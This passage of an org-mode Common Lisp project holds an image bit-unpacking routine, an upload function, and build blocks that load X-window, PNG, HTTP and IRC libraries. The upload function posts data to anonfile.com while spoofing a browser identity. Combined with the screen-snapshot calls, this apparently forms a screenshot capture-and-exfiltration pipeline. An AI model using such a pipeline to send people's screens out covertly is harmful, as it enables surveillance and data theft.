  (defun unpack-image (image)
    (declare (optimize (speed 3) (safety 0)))
    (let* ((dims (array-dimensions image))
           (height (car dims))
           (width (cadr dims))
           (new-width (ash width 3))
           (result (make-array (list height new-width)
                               :element-type '(unsigned-byte 8))))
      (declare (type fixnum width)
               (type fixnum new-width)
               (type fixnum height))
      (do ((qy 0 (incf qy)))
          ((= qy height))
        (declare (type fixnum qy))
        (do ((qx 0 (incf qx)))
            ((= qx width))
          (declare (type fixnum qx))
          (let ((acc (aref image qy qx)))
            (declare (type (unsigned-byte 8) acc))
            ;; (format t "~8,'0B" acc)
            (do ((out 0 (incf out))
                 (in  7 (decf in)))
                ((= 8 out))
              (declare (type fixnum out in))
              (unless (= 0 (logand acc (ash 1 in)))
                (setf (aref result qy (logior (ash qx 3) out))
                      255)))))
        ;; (format t "~%")
        )
      result))

  ;; TEST
  ;; (print
  ;;  (unpack-image
  ;;   (pack-image
  ;;    (x-snapshot :width 31 :height 23))))

  ;; TEST
  ;; (time
  ;;  (let* ((image  (load-png "FILE1088"))
  ;;         (unpack (unpack-image image))
  ;;         (dims (array-dimensions unpack)))
  ;;    (save-png (cadr dims)
  ;;              (car dims)
  ;;              (format nil "~A" (gensym "FILE"))
  ;;              unpack
  ;;              :grayscale)))
#+END_SRC

** Upload

#+NAME: upload
#+BEGIN_SRC lisp
  ;; (setf drakma:*header-stream* *standard-output*)

  (defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

  (defparameter *additional-headers*
    `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
      ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
      ("Accept-Charset" . "utf-8")))

  (defun get-csrf (text)
    (loop :for str :in (split-sequence:split-sequence #\Newline text)
       :do (multiple-value-bind (match-p result)
               (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
             (when match-p (return (aref result 0))))))

  (defun get-cookies-alist (cookie-jar)
    "Получаем alist с печеньками из cookie-jar"
    (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
         (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

  (defun anon-file-upload (filename content)
    (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
      ;; load mainpage for cookies, headers and csrf
      (multiple-value-bind (body-or-stream status-code headers
                                           uri stream must-close reason-phrase)
          (drakma:http-request "https://anonfile.com/"
                               :user-agent *user-agent*
                               :redirect 10
                               :force-binary t
                               :cookie-jar cookie-jar
                               :additional-headers *additional-headers*)
        (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
               (csrf (get-csrf text))
               (boundary "---------------------------196955623314664815241571979859")
               (type-header (format nil "multipart/form-data; boundary=~A" boundary))
               (new-headers `(("Accept" . "application/json")
                              ("Accept-Language" . "en-US,en;q=0.5")
                              ("Cache-Control" . "no-cache")
                              ("X-Requested-With" . "XMLHttpRequest")
                              ("X-CSRF-Token" . ,csrf)
                              ("Origin" . "https://anonfile.com")
                              ("Referer" . "https://anonfile.com/")
                              ("Content-Type" . ,type-header)
                              ("TE" . "Trailers"))))
          (multiple-value-bind (body-or-stream status-code headers
                                               uri stream must-close reason-phrase)
              (drakma:http-request
               "https://api.anonfile.com/upload"
               ;; "http://localhost:9993/upload"
               :user-agent *user-agent*
               :method :post
               :form-data t
               :content (format nil "--~A
  Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
  Content-Type: application/octet-stream

  ~A
  --~A--" boundary filename content boundary)
               :cookie-jar cookie-jar
               :additional-headers new-headers
               :force-binary t)
            (flex:octets-to-string body-or-stream :external-format :utf-8))))))

  ;; (anon-file-upload "555f.txt" "the content")


  ;; (alexandria:write-string-into-file
  ;;  (cl-base64:usb8-array-to-base64-string
  ;;   (alexandria:read-file-into-byte-vector #P"png.png"))
  ;;  #P"test.txt" :if-exists :supersede :external-format :utf-8)

  ;; (alexandria:write-byte-vector-into-file
  ;;  (cl-base64:base64-string-to-usb8-array
  ;;   (alexandria:read-file-into-string #P"test.txt" :external-format :utf-8))
  ;;  #P"test2" :if-exists :supersede)


  ;; (print (get-cookies-alist cookie-jar))
  ;; (print headers)
  ;; (setf drakma" . "drakma-default-external-format* :UTF-8)

  ;; (in-package :rigidus)

  ;; (ql:quickload "rigidus")

  ;; (restas:define-route upload ("/upload")
  ;;   "<form enctype=\"multipart/form-data\" method=\"post\">
  ;;    <input type=\"file\" name=\"file\">
  ;;    <input type=\"submit\" value=\"Отправить\">
  ;;    </form>")

  ;; (restas:define-route upload-post ("/upload" :method :post)
  ;;   (let ((file-info (hunchentoot:post-parameter "file")))
  ;;     ;; (hunchentoot:escape-for-html
  ;;     ;;  (alexandria:read-file-into-string (first file-info)))
  ;;     (format nil "~A"
  ;;             (bprint file-info))))
#+END_SRC

* Assembly

#+NAME:
#+BEGIN_SRC lisp :tangle s.lisp :noweb yes
  (ql:quickload "anaphora")
  (use-package :anaphora)
  (ql:quickload "bordeaux-threads")
  (ql:quickload "clx")
  (ql:quickload "zpng")
  (ql:quickload "png-read")
  (ql:quickload "drakma")
  (ql:quickload "cl-ppcre")
  (ql:quickload "cl-base64")
  (ql:quickload "prbs")
  (ql:quickload "cl-irc")
  (ql:quickload "cl-json")

  <<supervisor>>
#+END_SRC

#+NAME:
#+BEGIN_SRC lisp :tangle srv.lisp :noweb yes
  (ql:quickload "anaphora")
  (use-package :anaphora)
  (ql:quickload "bordeaux-threads")
  (ql:quickload "clx")
  (ql:quickload "zpng")
  (ql:quickload "png-read")
  (ql:quickload "drakma")
  (ql:quickload "cl-ppcre")
  (ql:quickload "cl-base64")
  (ql:quickload "prbs")
  (ql:quickload "cl-irc")
  (ql:quickload "cl-json")

  ;; may be not needed
  <<save_and_load_png>>
  <<binarization>>
  <<make_bit_image>>

  <<irc>>
  <<shot>>
#+END_SRC
